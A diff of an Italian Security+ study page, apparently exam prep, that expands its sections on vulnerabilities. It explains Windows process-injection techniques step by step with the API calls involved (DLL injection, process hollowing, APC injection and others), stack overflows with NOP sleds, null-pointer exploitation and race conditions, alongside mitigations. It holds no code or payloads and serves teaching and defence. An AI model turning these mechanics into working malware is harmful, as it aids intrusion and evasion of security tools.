@@ -43,21 +43,30 @@
 <div class="layout">
 
 <nav class="toc-sticky" aria-label="Indice">
+  <div class="toc-section">Generale</div>
+  <a href="#intro-concepts">Concetti Chiave</a>
+  <a href="#actors-interaction">Attori e Zero-Day</a>
+
   <div class="toc-section">Applicative</div>
   <a href="#mem-injection">Memory injection</a>
   <a href="#buffer-overflow">Buffer overflow</a>
-  <a href="#race-condition">Race condition (TOC/TOU)</a>
+  <a href="#pointer-dereference">Dereferencing (Null Pointer)</a>
+  <a href="#race-condition">Race condition (TOC/TOU/TOE)</a>
   <a href="#malicious-update">Malicious update</a>
 
   <div class="toc-section">Web-based</div>
   <a href="#sqli">SQL injection (SQLi)</a>
+  <a href="#xml-vulns">XML Injection & XML Bomb</a>
+  <a href="#code-injection">Code Injection & Vettori</a>
   <a href="#xss">Cross-site scripting (XSS)</a>
   <a href="#dir-traversal">Directory traversal</a>
+  <a href="#injection-mitigation">Validazione e Sanitizzazione</a>
 
   <div class="toc-section">OS e Hardware</div>
   <a href="#os-based">OS-based</a>
   <a href="#firmware">Firmware</a>
   <a href="#eol-legacy">End-of-life / Legacy</a>
+  <a href="#unpatched-systems">Unpatched systems</a>
 
   <div class="toc-section">Virtualizzazione</div>
   <a href="#vm-escape">VM escape</a>
@@ -85,6 +94,66 @@
 
 <main class="content" id="main">
 
+<!-- ══ CONCETTI CHIAVE E ATTORI ══════════════════════════════════ -->
+<section id="intro-concepts" style="margin-top: 0;">
+  <h2>Concetti Fondamentali: Vulnerabilità, Exploit e Malware</h2>
+  <p>
+    Prima di analizzare le specifiche tipologie di fallimenti di sicurezza, è indispensabile padroneggiare la catena teorica di causa-effetto che caratterizza una violazione dei sistemi informativi:
+  </p>
+  <dl class="termlist">
+    <dt>Vulnerability (Vulnerabilità)</dt>
+    <dd>Una debolezza o bug intrinseco sia logico (errore di programmazione, difetto di codice, configurazione errata) che fisico (hardware/firmware) all'interno di un sistema informativo, di una rete o di un'applicazione. Di per sé, la vulnerabilità è uno stato latente: rappresenta un potenziale varco d'accesso non autorizzato che attende di essere scoperto o sfruttato.</dd>
+
+    <dt>Identify (Identificazione / Identificare)</dt>
+    <dd>Il processo metodico di rilevare e mappare le vulnerabilità all'interno dell'infrastruttura aziendale. Viene condotto proattivamente dagli specialisti IT e di Security (Blue Team) attraverso scansioni di vulnerabilità automatizzate (vulnerability assessments), attività periodiche di auditing e programmi di coordinazione dei bug bounty. Identificare una falla prima di un avversario costituisce il primo passo critico per la difesa.</dd>
+
+    <dt>Exploit (Exploit / Codice di Sfruttamento)</dt>
+    <dd>Un frammento di software, un comando specifico, un carico utile (payload) o una combinazione metodologica programmata appositamente per sfruttare una determinata vulnerabilità. L'exploit traduce la debolezza latente in una violazione attiva dei privilegi di sistema, consentendo di eseguire comandi o aggirare controlli.</dd>
+
+    <dt>Malware (Software Malevolo)</dt>
+    <dd>Qualsiasi tipo di software progettato intenzionalmente per causare danni, interruzioni d'esercizio o sottrarre informazioni riservate. Spesso un attaccante si serve di un <strong>exploit</strong> come "testa d'ariete" per penetrare le difese e installare un agente persistente di <strong>malware</strong> (quali ransomware, spyware, Trojan, RAT o rootkit) che agisce indisturbato sul terminale compromesso.</dd>
+
+    <dt>Fix (Rimedio / Contromisura / Correzione)</dt>
+    <dd>Qualsiasi intervento correttivo, temporaneo o definitivo, applicato per disinnescare la vulnerabilità. Può trattarsi di un fix di configurazione (es: bloccare le porte vulnerabili a livello firewall, disabilitare un servizio non sicuro) o di una soluzione compensativa per neutralizzare l'exploit prima che sia disponibile un aggiornamento ufficiale.</dd>
+
+    <dt>Patch (Patch di Sicurezza / Aggiornamento)</dt>
+    <dd>La specifica tipologia di fix ufficiale rilasciata direttamente dal produttore (vendor) del software o dell'hardware. Un programma di patching pianificato applica questi pacchetti in modo metodico sul sistema operativo o sull'applicativo per sostituire in via permanente i blocchi di codice vulnerabili e ripristinare la sicurezza logica senza alterare le configurazioni.</dd>
+  </dl>
+</section>
+
+<section id="actors-interaction">
+  <h2>Il Ciclo del Zero-Day e il Ruolo dei Diversi Attori</h2>
+  <p>
+    Il tempo di reazione intercorso tra la prima scoperta di una vulnerabilità e il rilascio/integrazione della patch è noto come il <strong>periodo del "Zero-Day"</strong> (giorno zero). È importante distinguere tre espressioni strettamente correlate ma concettualmente distinte:
+  </p>
+  <div class="note-box" style="margin-bottom: 24px;">
+    <ul style="margin-left: 20px; line-height: 1.6;">
+      <li><strong>Zero-Day Vulnerability</strong>: La debolezza intrinseca di sicurezza presente nel codice completamente sconosciuta al produttore (vendor) e sprovvista di qualsiasi patch di protezione ufficiale.</li>
+      <li><strong>Zero-Day Exploit</strong>: Lo specifico tool o frammento di codice d'attacco sviluppato clandestinamente da un ricercatore o da un attaccante per approfittare della zero-day vulnerability prima che il mondo difensivo ne sia a conoscenza.</li>
+      <li><strong>Zero-Day Attack</strong>: Il concreto episodio d'attacco in ambiente reale in cui un bersaglio (una ditta, un governo o un utente) subisce la compromissione sistematica a opera di un aggressore che sta adoperando un exploit zero-day.</li>
+    </ul>
+  </div>
+
+  <h3 id="actors-role">Interazione degli Attori con Vulnerabilità ed Exploit</h3>
+  <p>
+    Il panorama delle minacce e della difesa (threat landscape) vede la continua interazione di tre categorie chiave d'attori con gli stati del software:
+  </p>
+  <dl class="termlist">
+    <dt>Criminals (I Cybercriminali)</dt>
+    <dd>Gruppi organizzati o attori singoli il cui scopo ordinario è monetizzare le proprie malefatte informatiche (financial gain). Ricercano costantemente vulnerabilità ed exploit per seminare ransomware o carpire informazioni riservate. Sono i principali consumatori e sviluppatori di malware di larga scala.</dd>
+
+    <dt>Government Agencies (Le Agenzie Governative e di Sicurezza Nazionale)</dt>
+    <dd>Organizzazioni nazionali (es: agenzie di intelligence statali, CISA negli Stati Uniti, ministeri della difesa) che operano con obiettivi di geopolitica o sicurezza statale. Possono agire in due modalità opposte:
+      <ul style="margin-left: 20px; margin-top: 6px;">
+        <li><em>In chiave difensiva</em>: Definendo standard minimi di isolamento, diffondendo avvisi d'emergenza (security bulletins) su vulnerabilità attive e spronando all'applicazione delle patch.</li>
+        <li><em>In chiave offensiva (Nation-state actors/APT)</em>: Acquistando o tenendo segreti preziosi Zero-Day (vulnerabilità ed exploit) per condurre attività silenti di cyberspionaggio o attacchi preventivi su infrastrutture critiche avversarie senza sprecare risorse rilevabili.</li>
+      </ul>
+    </dd>
+
+    <dt>Law Enforcement Agencies (Le Forze dell'Ordine / Polizia Postale, FBI, Europol)</dt>
+    <dd>Enti investigativi preposti a far rispettare la legge penale e sanzionare le intrusioni informatiche dei criminali. Cooperano strettamente con i team di Incident Response aziendali durante le indagini postventum, gestiscono canali formali per denunciare furti di identità o ricatti, e coordinano complesse "takedown operations" a livello planetario per abbattere e sequestrare rack fisici e server Command and Control (C2) infetti.</dd>
+  </dl>
+</section>
 
 <!-- ══ VULNERABILITÀ APPLICATIVE ════════════════════════════════ -->
 <section id="app-vulns">
@@ -107,12 +176,60 @@
     ma solo in memoria, può eludere molti antivirus tradizionali basati su firma di file.
   </p>
   <dl class="termlist">
-    <dt>Process injection</dt>
-    <dd>La forma più comune: il codice malevolo viene iniettato in un processo legittimo (es. svchost.exe su Windows, o il browser) e viene eseguito nel suo contesto, ereditandone i privilegi e le autorizzazioni.</dd>
-    <dt>DLL injection</dt>
-    <dd>Un attaccante forza un processo a caricare una Dynamic Link Library (DLL) malevola. La DLL viene eseguita nel contesto del processo, con i suoi permessi.</dd>
-    <dt>Shellcode injection</dt>
-    <dd>Codice macchina compatto (shellcode) viene iniettato in memoria e poi l'esecuzione viene reindirizzata ad esso tramite tecniche come buffer overflow o return-oriented programming (ROP).</dd>
+    <dt>Process injection (Iniezione di Processo)</dt>
+    <dd>
+      Rappresenta il concetto generale e la famiglia di tecniche attraverso cui porzioni di codice malevolo vengono introdotte e fatte eseguire nello spazio di indirizzamento della memoria virtuale di un processo attivo, legittimo e fidato (es. <code>svchost.exe</code>, <code>explorer.exe</code> o un browser web). 
+      <br><strong>• Scopo e Vantaggi Elusivi</strong>: Questa operazione consente al payload di operare in modalità <strong>fileless (senza file su disco)</strong>, ereditando la reputazione, i privilegi e le autorizzazioni della vittima ospitante. In questo modo si eludono i controlli anti-malware basati sull'identità e la firma dei file binari eseguiti.
+    </dd>
+
+    <dt>Injection through DLLs (Iniezione di DLL / DLL Injection)</dt>
+    <dd>
+      Una sottocategoria classica in cui l'attaccante costringe un processo vittima a caricare ed eseguire una libreria dinamica (Dynamic Link Library - DLL) dannosa.
+      <br><strong>• Il Meccanismo Tecnico</strong>: L'attaccante (1) ottiene un handle sul processo di destinazione, (2) alloca della memoria virtuale all'interno del processo bersaglio usando l'API di Windows <code>VirtualAllocEx</code>, (3) scrive il percorso della DLL malevola in questa nuova area tramite <code>WriteProcessMemory</code>, e (4) usa <code>CreateRemoteThread</code> per forzare il processo a creare un thread che punti all'indirizzo dell'API <code>LoadLibrary</code> del sistema operativo, passando come argomento il percorso scritto. All'esecuzione, la DLL viene caricata ed esegue il codice malevolo.
+    </dd>
+
+    <dt>Portable Executable (PE) Injection (Iniezione di PE)</dt>
+    <dd>
+      A differenza della DLL Injection (che si appoggia sulla chiamata API di sistema <code>LoadLibrary</code> e richiede il percorso di un file pronto), la <strong>PE Injection</strong> prevede che l'attaccante allochi e copi l'intero file eseguibile malevolo (il modulo PE in formato raw o compilato) direttamente nello spazio di memoria virtuale del processo vittima.
+      <br><strong>• Il Meccanismo Tecnico</strong>: Richiede l'allocazione manuale delle sezioni di memoria ed un complesso processo interno di <em>relocation</em> dei puntatori a indirizzi dinamici, comprensivo della ricostruzione manuale della <strong>Import Address Table (IAT)</strong> per consentire al codice iniettato di individuare le funzioni delle API di sistema in esecuzione. Una volta posizionato il PE, l'attaccante avvia l'esecuzione del codice puntando al nuovo Entry Point compilato.
+    </dd>
+
+    <dt>Thread Execution Hijacking (Dirottamento dell'Esecuzione del Thread)</dt>
+    <dd>
+      Invece di creare un nuovo thread remoto (azione monitorata strettamente dagli agenti di sicurezza), questa tecnica "sequestra" un thread pulito e già esistente nel processo target per costringerlo a eseguire codice dannoso.
+      <br><strong>• Il Meccanismo Tecnico</strong>: L'aggressione prevede la sospensione temporanea del thread vittima mediante la chiamata a <code>SuspendThread</code>. Successivamente, l'attaccante interroga e modifica lo stato dei registri della CPU del thread chiamando <code>GetThreadContext</code> e <code>SetThreadContext</code>. Sostituendo il valore del registro puntatore alle istruzioni (l'Instruction Pointer, ossia <code>EIP</code>/<code>RIP</code>) con l'indirizzo della memoria che ospita il payload, e infine liberando il thread mediante <code>ResumeThread</code>, il processore riprenderà l'esecuzione deviando immediatamente sul codice dell'attaccante.
+    </dd>
+
+    <dt>Process Hollowing (Svuotamento del Processo)</dt>
+    <dd>
+      Una tecnica sofisticata usata da molti trojan avanzati in cui viene creato un intero contenitore di processo pulito e poi "svuotato" per essere rimpiazzato dal malware.
+      <br><strong>• Il Meccanismo Tecnico</strong>: (1) L'attaccante avvia un'istanza di un eseguibile legittimo e fidato (es. <code>svchost.exe</code>) in uno stato congelato (chiamando l'API <code>CreateProcess</code> con il flag <code>CREATE_SUSPENDED</code>). (2) Successivamente, utilizza API non documentate del kernel (come <code>NtUnmapViewOfSection</code> o <code>ZwUnmapViewOfSection</code>) per disassociare e svuotare (hollow) l'intero codice originale del binario legittimo dallo spazio di memoria del processo. (3) Riassegna la memoria allocando un nuovo blocco e vi inserisce il payload del malware ricalcolando gli entrypoint. (4) Infine, modifica l'Instruction Pointer del thread congelato per agganciarlo al malware e riavvia l'esecuzione tramite <code>ResumeThread</code>. Agli occhi dell'utente e degli strumenti di sorveglianza base, il processo in esecuzione appartiene formalmente al file di sistema legittimo originario, ma in realtà esegue esclusivamente codice nocivo.
+    </dd>
+
+    <dt>Process Doppelgänging</dt>
+    <dd>
+      Una tecnica evasiva che sfrutta il meccanismo delle transazioni del file system di Windows, denominate <strong>Transactional NTFS (TxF)</strong>, per eseguire malware in memoria senza che questo compaia sui file fisici.
+      <br><strong>• Il Meccanismo Tecnico</strong>: L'attaccante (1) apre una transazione NTFS fittizia sul disco, (2) sovrascrive un file di sistema legittimo (es: <code>cmd.exe</code>) con del payload all'interno del contesto esclusivo di tale transazione isolata, (3) crea una sezione di memoria (un'immagine del processo) partendo da questo file "transato", e poi (4) effettua un <strong>rollback (annullamento)</strong> immediato della transazione prima di finalizzarla. Di conseguenza, sul disco rigido visibile il file legittimo non viene mai modificato e rimane immacolato (ingannando qualsiasi scansione antivirus), mentre in memoria l'immagine creata dal payload viene lanciata come processo a sé stante.
+    </dd>
+
+    <dt>Asynchronous Procedure Calls (APC Injection)</dt>
+    <dd>
+      L'iniezione tramite chiamate procedurali asincrone sfrutta le code <strong>APC (Asynchronous Procedure Call)</strong> di Windows, un meccanismo nativo che consente ai thread di eseguire funzioni in background in modo asincrono.
+      <br><strong>• Il Meccanismo Tecnico</strong>: L'attaccante inietta il codice malevolo nella memoria virtuale del processo bersaglio per poi accodare una funzione ad un thread di quel processo chiamando l'API <code>QueueUserAPC</code>. Quando il thread vittima entra in uno stato di attesa "allertabile" (alertable state, richiamando funzioni come <code>SleepEx</code>, <code>SignalObjectAndWait</code> o <code>WaitForMultipleObjectsEx</code>), il sistema operativo elabora automaticamente le chiamate accodate, costringendo il thread programmato a eseguire la funzione contenente il codice malevolo.
+    </dd>
+
+    <dt>Endpoint Security Solutions (Soluzioni di Sicurezza Endpoint)</dt>
+    <dd>
+      I moderni ambienti si difendono da queste sofisticate forme di memory evasion adottando ecosistemi di sicurezza avanzati per gli endpoint:
+      <br>• <strong>EDR (Endpoint Detection and Response) / XDR (Extended Detection and Response)</strong>: Rispetto ai tradizionali antivirus basati esclusivamente su firme statiche di file, un agente EDR monitora costantemente i comportamenti in tempo reale. Utilizza l'analisi euristica e tiene traccia delle chiamate ad API sensibili (come <code>OpenProcess</code> con diritti elevati, <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code>) correlando gli eventi tra processi (es. un processo anomalo non firmato che alloca memoria in un file di sistema).
+      <br>• <strong>HIDS (Host-based Intrusion Detection System)</strong>: Ispeziona log di sistema, configurazioni e modifiche ai file di sistema locali per rilevare pattern d'intrusione insoliti a livello di host.
+    </dd>
+
+    <dt>Security Kernel Module (Modulo di Sicurezza del Kernel)</dt>
+    <dd>
+      È un driver o componente di sicurezza che opera a livello di <strong>Kernel (Ring 0)</strong>, il livello di esecuzione con massima fiducia del sistema operativo.
+      <br><strong>• Perché è indispensabile</strong>: Poiché il malware in user mode (Ring 3) può alterare o intercettare le chiamate del proprio spazio d'azione (tramite user-mode hook), le soluzioni di sicurezza devono insediarsi direttamente nel kernel. Utilizzando moduli protetti o interfacce ufficiali come il driver <strong>ELAM (Early Launch Anti-Malware)</strong> e registrando callbacks nel kernel, i software di protezione possono ispezionare le operazioni di creazione processi e allocazioni di memoria in modo inalterabile, impedendo al malware a livello utente di nascondere le proprie tecniche di iniezione.
+    </dd>
   </dl>
 
   <div class="example-box">
@@ -125,67 +242,143 @@
     toccare il disco.
   </div>
 
-  <h3 id="buffer-overflow">Buffer overflow (Overflow del buffer)</h3>
+  <h3 id="buffer-overflow">Buffer overflow (Saturazione del buffer)</h3>
   <p>
-    Il <strong>buffer overflow</strong> si verifica quando un programma scrive più dati
-    di quanti un buffer (area di memoria allocata) possa contenere, sovrascrivendo aree
-    di memoria adiacenti. Se il programma non verifica i limiti dell'input
-    (<em>bounds checking</em>), un attaccante può deliberatamente fornire un input
-    troppo grande per sovrascrivere: l'indirizzo di ritorno di una funzione
-    (puntando a codice malevolo), variabili critiche del programma, o registri del
-    processore con indirizzi malevoli.
+    Il <strong>buffer overflow (overflow o saturazione del buffer)</strong> è una delle vulnerabilità più note e storiche della sicurezza del software. Si verifica nel momento in cui un programma tenta di scrivere dati all'interno di un'area di memoria allocata temporaneamente (detta <strong>buffer</strong>) in quantità superiore rispetto alla capienza massima prestabilita dell'area stessa. In mancanza di controlli rigorosi sui confini (<strong>bounds checking</strong>), i dati in eccesso finiscono per "esondare" e sovrascrivere i blocchi di memoria adiacenti.
   </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Stack vs Heap: le due varianti di overflow</h4>
   <p>
-    È una delle vulnerabilità più antiche e ancora diffuse, specialmente in codice C/C++
-    che gestisce direttamente la memoria. Linguaggi moderni come Java, Python e Rust
-    includono controlli automatici dei limiti che prevengono questi overflow.
+    La memoria allocata a un programma si divide in aree logiche distinte, ciascuna vulnerabile in modo differente:
   </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+    <li><strong>Stack-based Buffer Overflow (Overflow dello Stack)</strong>: Lo <em>stack</em> è l'area di memoria ordinata e sequenziale riservata a memorizzare le variabili locali delle funzioni e i relativi indirizzi di ritorno (Return Address). Se l'attaccante invia input di dimensioni spropositate ad una variabile allocata nello stack, i dati sovrascrivono l'adiacente Return Address o l'Instruction Pointer (un registro della CPU, es. EIP o RIP, che indica alla CPU quale istruzione eseguire successivamente). Sostituendo questo indirizzo con quello di un codice dannoso (es. uno <em>shellcode</em> appositamente iniettato), l'attaccante reindirizza il flusso di esecuzione CPU, realizzando l'<strong>Arbitrary Code Execution</strong> (esecuzione di codice arbitrario).</li>
+    <li><strong>Heap-based Buffer Overflow (Overflow dell'Heap)</strong>: L'<em>heap</em> è un pool di memoria dinamico e non strutturato a runtime per oggetti persistenti. Mandare in overflow l'heap non sovrascrive direttamente un indirizzo di ritorno (poiché lo stack non risiede qui), ma corrompe intestazioni e metadati degli oggetti o puntatori a oggetti e funzioni adiacenti, provocando crash di sistema, bypass dei privilegi o parziale controllo sul puntatore logico del programma.</li>
+  </ul>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Smashing the Stack e Istruzioni NOP (NOP Sled)</h4>
+  <p>
+    All'interno dell'orizzonte degli attacchi legati allo stack, esistono due concetti chiave di fondamentale rilevanza tecnica e storicamente testati negli esami di sicurezza:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+    <li><strong>Smashing the Stack (Distruzione dello Stack)</strong>: È il termine gergale (reso celebre dal saggio storico del 1996 "Smashing The Stack For Fun And Profit") di una specifica tecnica di sfruttamento dello stack-based buffer overflow. Consiste nell'introdurre deliberatamente in una variabile locale dello stack una stringa di caratteri (contenente codice eseguibile detto <em>shellcode</em>) di dimensioni superiori al buffer consentito, con lo scopo preciso di "schiacciare" (smash) e sovrascrivere l'indirizzo di ritorno (Return Address) memorizzato nello stack frame, alterando la sequenza di CPU per farla saltare all'inizio dello shellcode.</li>
+    <li><strong>Istruzione NOP e NOP Sled / NOP Slide (Slitta NOP)</strong>: Nei sistemi operativi moderni, gli indirizzi di memoria dello stack fluttuano leggermente di esecuzione in esecuzione, rendendo difficile per un attaccante prevedere l'indirizzo esatto in cui risiede lo shellcode a cui indirizzare la CPU. Per risolvere questo ostacolo, l'aggressore inietta una sequenza sequenziale di istruzioni <strong>NOP (No Operation)</strong> del processore (es: opcode <code>0x90</code> in architetture x86/x64) subito prima del codice dannoso, creando uno "scivolo" (o "slitta"). Se la CPU viene reindirizzata a un punto qualsiasi all'interno della sequenza di NOP, li eseguirà semplicemente uno dopo l'altro senza compiere operazioni (No-operation), scivolando senza danni direttamente fino a scontrarsi con il payload/shellcode finale ed eseguendolo con successo.</li>
+  </ul>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Come l'esame CompTIA testa questo argomento: Indizi Chiave</h4>
+  <p>
+    Nelle simulazioni o negli scenari d'esame, la presenza di un buffer overflow è solitamente associata a queste precise formulazioni:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+    <li>Mancanza di <strong>bounds checking (controlli sui limiti di lunghezza)</strong> nel codice sorgente quando l'utente fornisce un input.</li>
+    <li>Linguaggi di programmazione a basso livello sprovvisti di gestione nativa della memoria come il <strong>C</strong> e il <strong>C++</strong> (l'uso di funzioni insicure come <code>strcpy()</code>, <code>gets()</code> o <code>sprintf()</code> invece dei rispettivi equivalenti sicuri come <code>strncpy()</code>, <code>fgets()</code> o <code>snprintf()</code>).</li>
+    <li>Log o diagnosi di un'applicazione che ha smesso improvvisamente di funzionare (crash) o che ha mostrato indirizzi di registri modificati da input estranei (es. "sovrascrivere un registro o Instruction Pointer con un indirizzo malevolo").</li>
+  </ul>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le Tecniche di Mitigazione Avanzate</h4>
+  <p>
+    La difesa contro i buffer overflow richiede un approccio a molti livelli, che combina scrittura di codice sicuro con protezioni del sistema operativo a runtime:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+    <dt>Bounds Checking (Controllo dei Limiti)</dt>
+    <dd>La difesa primaria a livello software. Consiste nel verificare esplicitamente nel codice che la taglia dell'input dell'utente sia sempre inferiore o uguale alla dimensione dello spazio pre-allocato nel buffer prima di procedere a qualsiasi operazione di copia in memoria.</dd>
+
+    <dt>DEP — Data Execution Prevention (Prevenzione dell'Esecuzione dei Dati)</dt>
+    <dd>Nota in ambienti Linux come bit <strong>NX (No-Execute)</strong>, è una protezione hardware e software del sistema operativo che marca determinate sezioni di memoria (specificamente lo Stack e lo Heap) come non-eseguibili. Anche se un attaccante riesce a fare overflow su una variabile e iniettarvi uno shellcode in memoria, non appena tenta di reindirizzare l'Instruction Pointer all'esecuzione di quella porzione di memoria, la CPU blocca l'operazione sollevando un'eccezione, impedendo l'avvio del codice dannoso.</dd>
+
+    <dt>ASLR — Address Space Layout Randomization (Casualizzazione dello Spazio degli Indirizzi)</dt>
+    <dd>Tecnologia implementata dal sistema operativo che a ogni avvio del programma dispone in posizioni di memoria totalmente casuali lo stack, lo heap e le librerie caricate. In questo modo, l'attaccante non può compilare a priori indirizzi statici nel suo exploit (es. non sa dove punterà lo stack), rendendo estremamente complessa la redirezione dell'Instruction Pointer verso il suo payload.</dd>
+
+    <dt>Stack Canaries (Stack Cookies) / Canarini dello Stack</dt>
+    <dd>Istruzioni aggiuntive iniettate dal compilatore che pongono un valore casuale fisso (detto "canarino") tra l'allocazione delle variabili e l'indirizzo di ritorno nello stack. Prima che una funzione termini e usi l'indirizzo di ritorno, il compilatore controlla l'integrità di questo segreto: se è stato modificato (come accadrebbe in caso di overflow che tenta di sovrascrivere l'indirizzo di ritorno), l'applicazione viene immediatamente arrestata scongiurando l'esecuzione di codice arbitrario.</dd>
+
+    <dt>Safe Languages (Linguaggi Sicuri)</dt>
+    <dd>Scelta strutturale basata sull'adozione di linguaggi moderni (come Java, Python, C# o Rust) i quali gestiscono la memoria e i confini degli array in automatico o tramite runtime sicuri, azzerando di fatto la possibilità di generare overflow non intercettati.</dd>
+  </dl>
 
   <div class="pitfall">
     <strong>ATTENZIONE — Buffer overflow vs Memory injection</strong><br>
-    <strong>Buffer overflow:</strong> il programma riceve dati di dimensione inaspettata
-    che sovrascrivono memoria adiacente → l'attacco sfrutta l'assenza di bounds checking.<br>
-    <strong>Memory injection:</strong> codice malevolo viene copiato nello spazio di
-    memoria allocato di un processo già in esecuzione → il processo esiste già,
-    l'attaccante vi "inietta" il codice dall'esterno.<br>
-    Il buffer overflow può essere il <em>vettore</em> attraverso cui si realizza
-    una memory injection.
+    <strong>Buffer overflow:</strong> il programma riceve dati di dimensione inaspettata (mancanza di bounds checking) che sovrascrivono e alterano sezioni di memoria adiacente, potendo puntare a redirezione del codice.<br>
+    <strong>Memory injection:</strong> codice malevolo viene copiato nello spazio di memoria allocato di un processo già attivo in esecuzione (senza necessariamente sfruttare un overflow d'ingresso, ma magari sfruttando chiamate API del sistema operativo o manipolazione dei sub-processi).<br>
+    Il buffer overflow può agire come <em>vettore</em> preliminare attraverso cui si compie un attacco di memory injection.
   </div>
 
-  <h3 id="race-condition">Race condition — TOC/TOU</h3>
+  <h3 id="pointer-dereference">Dereferencing (Null Pointer Dereference)</h3>
   <p>
-    Una <strong>race condition (condizione di gara)</strong> si verifica quando il
-    comportamento di un sistema dipende dalla sequenza temporale di eventi concorrenti
-    che non è garantita. In sicurezza, la race condition più rilevante è il pattern
-    <strong>TOC/TOU (Time-of-Check / Time-of-Use)</strong>:
+    Il termine <strong>dereferenziamento (dereferencing)</strong> si riferisce all'operazione con cui un programma accede al valore o all'area di memoria a cui punta una determinata variabile di tipo puntatore. Si tratta di un'operazione comune e necessaria nei linguaggi di programmazione a basso livello (come C o C++).
   </p>
-  <dl class="termlist">
-    <dt>Time-of-Check (TOC)</dt>
-    <dd>Il momento in cui il sistema verifica una condizione (es. "questo utente ha i permessi per accedere a questo file?").</dd>
-    <dt>Time-of-Use (TOU)</dt>
-    <dd>Il momento in cui il sistema usa il risultato di quella verifica (es. "apri il file").</dd>
-    <dt>L'attacco</dt>
-    <dd>Se un attaccante riesce a modificare le condizioni <em>tra</em> il TOC e il TOU — nella finestra temporale tra la verifica e l'uso — può sfruttare il sistema. Esempio classico: la verifica (TOC) controlla che un file sia legittimo; l'attaccante lo sostituisce con un file malevolo prima che venga usato (TOU). Il sistema usa il file malevolo credendolo legittimo.</dd>
+  <p>
+    Tuttavia, si verifica una vulnerabilità di <strong>Null Pointer Dereference (Dereferenziazione di un puntatore nullo)</strong> quando l'applicazione tenta di dereferenziare un puntatore che si aspetta essere valido, ma che in realtà corrisponde ad un indirizzo nullo (<code>NULL</code> o <code>0x0</code>).
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Denial of Service (DoS) per Crash applicativo</dt>
+    <dd>Nello scenario tipico, tentare di accedere alla pagina zero (indirizzo nullo) fa fallire i meccanismi di indirizzamento hardware del MMU, inducendo il sistema operativo a sollevare una violazione di accesso (Segmentation Fault) che interrompe e fa crashare istantaneamente il processo. Questo provoca un'improvvisa indisponibilità del servizio.</dd>
+
+    <dt>Privilege Escalation & Code Execution (Esecuzione di Codice Arbitrario)</dt>
+    <dd>In particolari scenari (specialmente nei driver di livello kernel o in architetture embedded / sistemi operativi senza moderne protezioni di virtual memory), se un attaccante può allocare o mappare preventivamente del codice malevolo proprio all'indirizzo virtuale <code>0x0</code> (ad esempio tramite chiamate <code>mmap()</code> con privilegi deboli), il dereferenziamento nullo eseguito dal kernel salterà direttamente sul payload dell'attaccante anziché interrompersi con un crash, consentendogli l'esecuzione di codice arbitrario o una Local Privilege Escalation.</dd>
+
+    <dt>Prevenzione e Mitigazione</dt>
+    <dd>Sottoporre i puntatori a rigidi ed espliciti controlli preventivi di non-nullità prima di ogni dereferenziazione (es. <code>if (mio_puntatore != NULL)</code>), privilegiare l'impiego di linguaggi moderni aventi gestione sicura dei puntatori (come Rust o C#) ed abilitare le protezioni a livello di kernel e sistema operativo per vietare la mappatura delle pagine di memoria più basse (ad esempio con l'opzione <code>mmap_min_addr</code> in Linux) impedendo agli hacker di mappare dati nell'indirizzo zero.</dd>
   </dl>
 
-  <div class="example-box">
-    <strong>Esempio pratico — Race condition in un database</strong><br>
-    Durante un aggiornamento SQL del database, viene creato un campo temporaneo per la
-    transazione. Un attaccante sfrutta la finestra temporale tra la creazione del campo
-    (TOC) e il suo utilizzo (TOU) per sostituire il valore del campo con uno malevolo
-    che permette l'accesso al sistema. Il database usa il valore modificato credendolo
-    legittimo. Questo scenario è classificato come "malicious update" con la tecnica
-    della race condition.
-  </div>
+  <h3 id="race-condition">Race condition — TOC/TOU (Condizione di gara)</h3>
+  <p>
+    Una <strong>race condition (condizione di gara)</strong> si verifica quando la correttezza del comportamento di un sistema informatico dipende dalla sequenza temporale o dal <strong>timing</strong> di eventi concorrenti non sincronizzati (como più thread o processi che accedono alla stessa risorsa). Se l'ordine finale di esecuzione non è garantito fermamente da meccanismi di sincronizzazione, la risorsa condivisa può scivolare in uno stato incoerente, instabile o modificato.
+  </p>
+  <p>
+    In sicurezza computazionale, le race condition rappresentano una classe di vulnerabilità temporali subdole in cui l'aggressore manipola l'intervallo temporale tra le diverse fasi operative del software per sottrarsi ai controlli di convalida.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">L'Asse Temporale dei Controlli: TOC, TOU e TOE</h4>
+  <p>
+    Le interazioni temporali di questa classe di vulnerabilità si scompongono in precisi momenti logici:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+    <li><strong>Time-of-Check (TOC - Tempo di Controllo):</strong> Il momento iniziale in cui l'applicazione esegue una verifica di idoneità ed autorizzazione su una determinata risorsa (es. <code>"Questo file è sicuro da aprire ed appartiene all'utente?"</code>).</li>
+    <li><strong>La Finestra d'Opportunità (Race Window):</strong> È la frazione infinitesimale di tempo che intercorre tra il completamento positivo della verifica (TOC) e l'azione reale dell'applicazione. Se l'attaccante riesce a deviare il controllo CPU proprio in questa finestra, può scambiare o corrompere lo stato della risorsa (es. eliminando il file controllato e sostituendolo con un collegamento simbolico a un file sensibile di sistema).</li>
+    <li><strong>Time-of-Use (TOU - Tempo d'Uso):</strong> Il momento finale in cui il programma agisce sulla risorsa assumendo erroneamente che le condizioni misurate nella fase TOC siano rimaste intatte e valide, finendo per compiere azioni non legittime per conto dell'attaccante.</li>
+    <li><strong>Time-of-Evaluation (TOE - Tempo di Valutazione):</strong> Il momento specifico a livello hardware, compilatore o interprete in cui lo stato di un'istruzione viene calcolato e letto per prenderne decisioni. Se la valutazione (TOE) viene eseguita su copie di dati temporanei non sincronizzati (stale data) o sfasati, si innescano anomalie temporali capaci di falsare il flusso logico del sistema operativo o di bypassare l'autorizzazione autorizzata.</li>
+  </ul>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Scenari d'Attacco Classici e Famosi</h4>
